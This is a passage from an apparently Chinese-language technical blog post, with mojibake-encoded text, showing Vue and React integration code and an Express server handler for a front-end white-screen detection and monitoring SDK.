    &lt;button @click="checkWhiteScreen"&gt;æ‰‹åŠ¨æ£€æµ‹ç™½å±&lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup lang="ts"&gt;
import { useWhiteScreen } from '@/plugins/white-screen-plugin';

const whiteScreenSDK = useWhiteScreen();

async function checkWhiteScreen() {
  if (whiteScreenSDK) {
    const result = await whiteScreenSDK.manualDetect();
    console.log('æ£€æµ‹ç»“æœ:', result);
    
    if (result.isWhiteScreen) {
      alert('æ£€æµ‹åˆ°ç™½å±é—®é¢˜ï¼');
    } else {
      alert('é¡µé¢æ­£å¸¸');
    }
  }
}
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-7">4. React é›†æˆç¤ºä¾‹</h4>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// WhiteScreenContext.tsx</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { createContext, useContext, useEffect, useRef, <span class="hljs-title class_">ReactNode</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">WhiteScreenSDK</span>, <span class="hljs-title class_">WhiteScreenConfig</span>, <span class="hljs-title class_">DetectionResult</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./white-screen-sdk'</span>;

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">WhiteScreenContextValue</span> {
  <span class="hljs-attr">sdk</span>: <span class="hljs-title class_">WhiteScreenSDK</span> | <span class="hljs-literal">null</span>;
  <span class="hljs-attr">manualDetect</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">DetectionResult</span> | <span class="hljs-literal">null</span>&gt;;
  <span class="hljs-attr">getStats</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">ReturnType</span>&lt;<span class="hljs-title class_">WhiteScreenSDK</span>[<span class="hljs-string">'getStats'</span>]&gt; | <span class="hljs-literal">null</span>;
}

<span class="hljs-keyword">const</span> <span class="hljs-title class_">WhiteScreenContext</span> = createContext&lt;<span class="hljs-title class_">WhiteScreenContextValue</span>&gt;({
  <span class="hljs-attr">sdk</span>: <span class="hljs-literal">null</span>,
  <span class="hljs-attr">manualDetect</span>: <span class="hljs-keyword">async</span> () =&gt; <span class="hljs-literal">null</span>,
  <span class="hljs-attr">getStats</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-literal">null</span>
});

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">WhiteScreenProviderProps</span> {
  <span class="hljs-attr">children</span>: <span class="hljs-title class_">ReactNode</span>;
  config?: <span class="hljs-title class_">Partial</span>&lt;<span class="hljs-title class_">WhiteScreenConfig</span>&gt;;
  onWhiteScreen?: <span class="hljs-function">(<span class="hljs-params">result: DetectionResult</span>) =&gt;</span> <span class="hljs-built_in">void</span>;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">WhiteScreenProvider</span>(<span class="hljs-params">{ 
  children, 
  config = {},
  onWhiteScreen 
}: WhiteScreenProviderProps</span>) {
  <span class="hljs-keyword">const</span> sdkRef = useRef&lt;<span class="hljs-title class_">WhiteScreenSDK</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>);
  
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// åˆ›å»º SDK å®ä¾‹</span>
    <span class="hljs-keyword">const</span> sdk = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteScreenSDK</span>({
      <span class="hljs-attr">keyElementSelectors</span>: [<span class="hljs-string">'#root'</span>, <span class="hljs-string">'[data-reactroot]'</span>, <span class="hljs-string">'.app-container'</span>],
      <span class="hljs-attr">enableInDev</span>: <span class="hljs-literal">false</span>,
      ...config,
      <span class="hljs-attr">onDetectionComplete</span>: <span class="hljs-function">(<span class="hljs-params">result</span>) =&gt;</span> {
        config.<span class="hljs-property">onDetectionComplete</span>?.(result);
        
        <span class="hljs-keyword">if</span> (result.<span class="hljs-property">isWhiteScreen</span> &amp;&amp; onWhiteScreen) {
          <span class="hljs-title function_">onWhiteScreen</span>(result);
        }
      }
    });
    
    sdkRef.<span class="hljs-property">current</span> = sdk;
    
    <span class="hljs-comment">// åˆå§‹åŒ–</span>
    sdk.<span class="hljs-title function_">init</span>();
    
    <span class="hljs-comment">// æ¸…ç†</span>
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      sdk.<span class="hljs-title function_">destroy</span>();
      sdkRef.<span class="hljs-property">current</span> = <span class="hljs-literal">null</span>;
    };
  }, []);
  
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">manualDetect</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">if</span> (sdkRef.<span class="hljs-property">current</span>) {
      <span class="hljs-keyword">return</span> sdkRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">manualDetect</span>();
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
  };
  
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">getStats</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">if</span> (sdkRef.<span class="hljs-property">current</span>) {
      <span class="hljs-keyword">return</span> sdkRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">getStats</span>();
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
  };
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">WhiteScreenContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{{</span> 
      <span class="hljs-attr">sdk:</span> <span class="hljs-attr">sdkRef.current</span>, 
      <span class="hljs-attr">manualDetect</span>, 
      <span class="hljs-attr">getStats</span> 
    }}&gt;</span>
      {children}
    <span class="hljs-tag">&lt;/<span class="hljs-name">WhiteScreenContext.Provider</span>&gt;</span></span>
  );
}

<span class="hljs-comment">// Hook</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useWhiteScreen</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">WhiteScreenContext</span>);
}

<span class="hljs-comment">// HOC</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> withWhiteScreenDetection&lt;P <span class="hljs-keyword">extends</span> <span class="hljs-built_in">object</span>&gt;(
  <span class="hljs-title class_">WrappedComponent</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">ComponentType</span>&lt;P&gt;,
  config?: <span class="hljs-title class_">Partial</span>&lt;<span class="hljs-title class_">WhiteScreenConfig</span>&gt;
) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">WithWhiteScreenComponent</span>(<span class="hljs-params">props: P</span>) {
    <span class="hljs-keyword">return</span> (
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">WhiteScreenProvider</span> <span class="hljs-attr">config</span>=<span class="hljs-string">{config}</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">WrappedComponent</span> {<span class="hljs-attr">...props</span>} /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">WhiteScreenProvider</span>&gt;</span></span>
    );
  };
}
</code></pre>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// App.tsx</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">WhiteScreenProvider</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./contexts/WhiteScreenContext'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleWhiteScreen</span> = (<span class="hljs-params">result</span>) =&gt; {
    <span class="hljs-comment">// ç™½å±æ—¶çš„å¤„ç†é€»è¾‘</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'æ£€æµ‹åˆ°ç™½å±:'</span>, result);
    
    <span class="hljs-comment">// å¯ä»¥æ˜¾ç¤ºé”™è¯¯è¾¹ç•Œæˆ–é‡è¯•æŒ‰é’®</span>
    <span class="hljs-comment">// setShowErrorBoundary(true);</span>
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">WhiteScreenProvider</span> 
      <span class="hljs-attr">config</span>=<span class="hljs-string">{{</span>
        <span class="hljs-attr">threshold:</span> <span class="hljs-attr">0.85</span>,
        <span class="hljs-attr">delay:</span> <span class="hljs-attr">2000</span>,
        <span class="hljs-attr">enableScreenshotDetection:</span> <span class="hljs-attr">false</span>
      }}
      <span class="hljs-attr">onWhiteScreen</span>=<span class="hljs-string">{handleWhiteScreen}</span>
    &gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"app"</span>&gt;</span>
        {/* åº”ç”¨å†…å®¹ */}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">WhiteScreenProvider</span>&gt;</span></span>
  );
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span>;
</code></pre>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// åœ¨ç»„ä»¶ä¸­ä½¿ç”¨</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { useWhiteScreen } <span class="hljs-keyword">from</span> <span class="hljs-string">'./contexts/WhiteScreenContext'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">DebugPanel</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> { manualDetect, getStats } = <span class="hljs-title function_">useWhiteScreen</span>();
  
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleCheck</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">manualDetect</span>();
    <span class="hljs-keyword">if</span> (result) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ£€æµ‹ç»“æœ:'</span>, result);
      <span class="hljs-title function_">alert</span>(result.<span class="hljs-property">isWhiteScreen</span> ? <span class="hljs-string">'æ£€æµ‹åˆ°ç™½å±'</span> : <span class="hljs-string">'é¡µé¢æ­£å¸¸'</span>);
    }
  };
  
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleShowStats</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> stats = <span class="hljs-title function_">getStats</span>();
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç»Ÿè®¡ä¿¡æ¯:'</span>, stats);
  };
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"debug-panel"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleCheck}</span>&gt;</span>æ‰‹åŠ¨æ£€æµ‹ç™½å±<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleShowStats}</span>&gt;</span>æŸ¥çœ‹ç»Ÿè®¡<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<h3 data-id="heading-8">å››ã€æœåŠ¡ç«¯æ•°æ®å¤„ç†ç¤ºä¾‹</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// server/white-screen-handler.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Request</span>, <span class="hljs-title class_">Response</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'express'</span>;

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">WhiteScreenReport</span> {
  <span class="hljs-attr">isWhiteScreen</span>: <span class="hljs-built_in">boolean</span>;
  <span class="hljs-attr">timestamp</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">detectionMethod</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">userAgent</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">viewport</span>: { <span class="hljs-attr">width</span>: <span class="hljs-built_in">number</span>; <span class="hljs-attr">height</span>: <span class="hljs-built_in">number</span> };
  performanceData?: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">number</span>&gt;;
  errorInfo?: { <span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span>; stack?: <span class="hljs-built_in">string</span>; <span class="hljs-attr">type</span>: <span class="hljs-built_in">string</span> };
  <span class="hljs-comment">// ... å…¶ä»–å­—æ®µ</span>
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">WhiteScreenStats</span> {
  <span class="hljs-attr">totalReports</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">whiteScreenCount</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">whiteScreenRate</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">topUrls</span>: { <span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span> }[];
  <span class="hljs-attr">topErrors</span>: { <span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span> }[];
  <span class="hljs-attr">hourlyDistribution</span>: { <span class="hljs-attr">hour</span>: <span class="hljs-built_in">number</span>; <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span> }[];
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">WhiteScreenAnalyzer</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">reports</span>: <span class="hljs-title class_">WhiteScreenReport</span>[] = [];
  <span class="hljs-keyword">private</span> <span class="hljs-attr">maxReports</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">10000</span>;
  
  <span class="hljs-comment">/**
   * æ·»åŠ æŠ¥å‘Š
   */</span>
  <span class="hljs-title function_">addReport</span>(<span class="hljs-attr">report</span>: <span class="hljs-title class_">WhiteScreenReport</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">reports</span>.<span class="hljs-title function_">push</span>(report);
    
    <span class="hljs-comment">// ä¿æŒæŠ¥å‘Šæ•°é‡åœ¨é™åˆ¶å†…</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">reports</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">maxReports</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">reports</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">reports</span>.<span class="hljs-title function_">slice</span>(-<span class="hljs-variable language_">this</span>.<span class="hljs-property">maxReports</span>);
    }
  }
  
  <span class="hljs-comment">/**
   * è·å–ç»Ÿè®¡æ•°æ®
   */</span>
  <span class="hljs-title function_">getStats</span>(timeRange?: { <span class="hljs-attr">start</span>: <span class="hljs-built_in">number</span>; <span class="hljs-attr">end</span>: <span class="hljs-built_in">number</span> }): <span class="hljs-title class_">WhiteScreenStats</span> {
    <span class="hljs-keyword">let</span> filteredReports = <span class="hljs-variable language_">this</span>.<span class="hljs-property">reports</span>;
    
    <span class="hljs-keyword">if</span> (timeRange) {
      filteredReports = <span class="hljs-variable language_">this</span>.<span class="hljs-property">reports</span>.<span class="hljs-title function_">filter</span>(
        <span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.<span class="hljs-property">timestamp</span> &gt;= timeRange.<span class="hljs-property">start</span> &amp;&amp; r.<span class="hljs-property">timestamp</span> &lt;= timeRange.<span class="hljs-property">end</span>
      );
    }
    
    <span class="hljs-keyword">const</span> totalReports = filteredReports.<span class="hljs-property">length</span>;
    <span class="hljs-keyword">const</span> whiteScreenReports = filteredReports.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.<span class="hljs-property">isWhiteScreen</span>);
    <span class="hljs-keyword">const</span> whiteScreenCount = whiteScreenReports.<span class="hljs-property">length</span>;
    <span class="hljs-keyword">const</span> whiteScreenRate = totalReports &gt; <span class="hljs-number">0</span> ? whiteScreenCount / totalReports : <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// ç»Ÿè®¡ Top URLs</span>
    <span class="hljs-keyword">const</span> urlCounts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">number</span>&gt;();
    whiteScreenReports.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> {
      <span class="hljs-keyword">const</span> url = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(r.<span class="hljs-property">url</span>).<span class="hljs-property">pathname</span>;
      urlCounts.<span class="hljs-title function_">set</span>(url, (urlCounts.<span class="hljs-title function_">get</span>(url) || <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>);
    });
    
    <span class="hljs-keyword">const</span> topUrls = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(urlCounts.<span class="hljs-title function_">entries</span>())
      .<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">[url, count]</span>) =&gt;</span> ({ url, count }))
      .<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> b.<span class="hljs-property">count</span> - a.<span class="hljs-property">count</span>)
      .<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>);
    
    <span class="hljs-comment">// ç»Ÿè®¡ Top Errors</span>
    <span class="hljs-keyword">const</span> errorCounts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">number</span>&gt;();
    whiteScreenReports.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> {
      <span class="hljs-keyword">if</span> (r.<span class="hljs-property">errorInfo</span>?.<span class="hljs-property">message</span>) {
        <span class="hljs-keyword">const</span> msg = r.<span class="hljs-property">errorInfo</span>.<span class="hljs-property">message</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>);
        errorCounts.<span class="hljs-title function_">set</span>(msg, (errorCounts.<span class="hljs-title function_">get</span>(msg) || <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>);
      }
    });
    
    <span class="hljs-keyword">const</span> topErrors = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(errorCounts.<span class="hljs-title function_">entries</span>())
      .<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">[message, count]</span>) =&gt;</span> ({ message, count }))
      .<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> b.<span class="hljs-property">count</span> - a.<span class="hljs-property">count</span>)
      .<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>);
    
    <span class="hljs-comment">// å°æ—¶åˆ†å¸ƒ</span>
    <span class="hljs-keyword">const</span> hourCounts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">24</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">0</span>);
    whiteScreenReports.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> {
      <span class="hljs-keyword">const</span> hour = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(r.<span class="hljs-property">timestamp</span>).<span class="hljs-title function_">getHours</span>();
      hourCounts[hour]++;
    });
    
    <span class="hljs-keyword">const</span> hourlyDistribution = hourCounts.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">count, hour</span>) =&gt;</span> ({ hour, count }));
    
    <span class="hljs-keyword">return</span> {
      totalReports,
      whiteScreenCount,
      whiteScreenRate,
      topUrls,
      topErrors,
      hourlyDistribution
    };
  }
  
  <span class="hljs-comment">/**
   * æ£€æŸ¥æ˜¯å¦éœ€è¦å‘Šè­¦
   */</span>
  <span class="hljs-title function_">shouldAlert</span>(): { <span class="hljs-attr">alert</span>: <span class="hljs-built_in">boolean</span>; <span class="hljs-attr">reason</span>: <span class="hljs-built_in">string</span> } {
    <span class="hljs-keyword">const</span> recentReports = <span class="hljs-variable language_">this</span>.<span class="hljs-property">reports</span>.<span class="hljs-title function_">filter</span>(
      <span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - r.<span class="hljs-property">timestamp</span> &lt; <span class="hljs-number">5</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span> <span class="hljs-comment">// æœ€è¿‘5åˆ†é’Ÿ</span>
    );
    
    <span class="hljs-keyword">if</span> (recentReports.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">alert</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">reason</span>: <span class="hljs-string">''</span> };
    }
    
    <span class="hljs-keyword">const</span> whiteScreenRate = recentReports.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.<span class="hljs-property">isWhiteScreen</span>).<span class="hljs-property">length</span> / recentReports.<span class="hljs-property">length</span>;
    
    <span class="hljs-keyword">if</span> (whiteScreenRate &gt; <span class="hljs-number">0.1</span>) {
      <span class="hljs-keyword">return</span> { 
        <span class="hljs-attr">alert</span>: <span class="hljs-literal">true</span>, 
        <span class="hljs-attr">reason</span>: <span class="hljs-string">`ç™½å±ç‡è¿‡é«˜: <span class="hljs-subst">${(whiteScreenRate * <span class="hljs-number">100</span>).toFixed(<span class="hljs-number">1</span>)}</span>%`</span> 
      };
    }
    
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">alert</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">reason</span>: <span class="hljs-string">''</span> };
  }
}

<span class="hljs-comment">// Express è·¯ç”±å¤„ç†</span>
<span class="hljs-keyword">const</span> analyzer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteScreenAnalyzer</span>();

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleWhiteScreenReport</span>(<span class="hljs-params">req: Request, res: Response</span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> <span class="hljs-attr">reports</span>: <span class="hljs-title class_">WhiteScreenReport</span>[] = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(req.<span class="hljs-property">body</span>) ? req.<span class="hljs-property">body</span> : [req.<span class="hljs-property">body</span>];
    
    reports.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">report</span> =&gt;</span> {
      analyzer.<span class="hljs-title function_">addReport</span>(report);
    });
    
    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦éœ€è¦å‘Šè­¦</span>
    <span class="hljs-keyword">const</span> alertStatus = analyzer.<span class="hljs-title function_">shouldAlert</span>();
    <span class="hljs-keyword">if</span> (alertStatus.<span class="hljs-property">alert</span>) {
      <span class="hljs-comment">// å‘é€å‘Šè­¦ï¼ˆä¾‹å¦‚ï¼šå‘é€é‚®ä»¶ã€çŸ­ä¿¡ã€é’‰é’‰é€šçŸ¥ç­‰ï¼‰</span>
      <span class="hljs-title function_">sendAlert</span>(alertStatus.<span class="hljs-property">reason</span>);
    }
    
    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">json</span>({ <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">received</span>: reports.<span class="hljs-property">length</span> });
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'å¤„ç†ç™½å±æŠ¥å‘Šå¤±è´¥:'</span>, error);
    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>({ <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">error</span>: (error <span class="hljs-keyword">as</span> <span class="hljs-title class_">Error</span>).<span class="hljs-property">message</span> });
  }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getWhiteScreenStats</span>(<span class="hljs-params">req: Request, res: Response</span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> { start, end } = req.<span class="hljs-property">query</span>;
    
    <span class="hljs-keyword">const</span> timeRange = start &amp;&amp; end 
      ? { <span class="hljs-attr">start</span>: <span class="hljs-title class_">Number</span>(start), <span class="hljs-attr">end</span>: <span class="hljs-title class_">Number</span>(end) }
      : <span class="hljs-literal">undefined</span>;
    
    <span class="hljs-keyword">const</span> stats = analyzer.<span class="hljs-title function_">getStats</span>(timeRange);
    res.<span class="hljs-title function_">json</span>(stats);
  } <span class="hljs-keyword">catch</span> (error) {
    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>({ <span class="hljs-attr">error</span>: (error <span class="hljs-keyword">as</span> <span class="hljs-title class_">Error</span>).<span class="hljs-property">message</span> });
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">sendAlert</span>(<span class="hljs-params">reason: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-comment">// å®ç°å‘Šè­¦é€»è¾‘</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'[ç™½å±å‘Šè­¦]'</span>, reason);
  <span class="hljs-comment">// å¯ä»¥é›†æˆå„ç§å‘Šè­¦æ¸ é“ï¼šé‚®ä»¶ã€çŸ­ä¿¡ã€é’‰é’‰ã€ä¼ä¸šå¾®ä¿¡ç­‰</span>
}
</code></pre>
<h3 data-id="heading-9">äº”ã€æ€»ç»“</h3>
<p>ä»¥ä¸Šä»£ç å®ç°äº†ä¸€ä¸ªå®Œæ•´çš„å‰ç«¯ç™½å±æ£€æµ‹ SDKï¼ŒåŒ…å«ä»¥ä¸‹æ ¸å¿ƒåŠŸèƒ½ï¼š</p>
<ol>
<li>
<p><strong>å¤šç§æ£€æµ‹æ–¹æ³•</strong>ï¼š</p>
<ul>
<li>é‡‡æ ·ç‚¹æ£€æµ‹ - åœ¨é¡µé¢å…³é”®ä½ç½®é‡‡æ ·åˆ¤æ–­</li>
<li>DOM æ£€æµ‹ - æ£€æŸ¥å…³é”® DOM å…ƒç´ æ˜¯å¦å­˜åœ¨å’Œå¯è§</li>
<li>MutationObserver æ£€æµ‹ - ç›‘å¬ DOM å˜åŒ–</li>
<li>æˆªå›¾æ£€æµ‹ - é€šè¿‡ Canvas åˆ†æé¡µé¢å†…å®¹</li>
<li>éª¨æ¶å±æ£€æµ‹ - æ£€æµ‹ loading çŠ¶æ€</li>
</ul>
</li>
<li>
<p><strong>å®Œå–„çš„ä¸ŠæŠ¥æœºåˆ¶</strong>ï¼š</p>
<ul>
<li>æ”¯æŒ Beacon API å’Œ fetch é™çº§</li>
<li>é˜Ÿåˆ—æ‰¹é‡ä¸ŠæŠ¥</li>
<li>é¡µé¢å¸è½½æ—¶å‘é€</li>
</ul>
</li>
<li>
<p><strong>æ¡†æ¶é›†æˆ</strong>ï¼š</p>
<ul>
<li>Vue 3 æ’ä»¶å’Œ Composition API Hook</li>
<li>React Context å’Œ Hook</li>
</ul>
</li>
<li>
<p><strong>æœåŠ¡ç«¯å¤„ç†</strong>ï¼š</p>
<ul>
<li>æ•°æ®ç»Ÿè®¡åˆ†æ</li>
<li>å‘Šè­¦æœºåˆ¶</li>
</ul>
</li>
</ol>
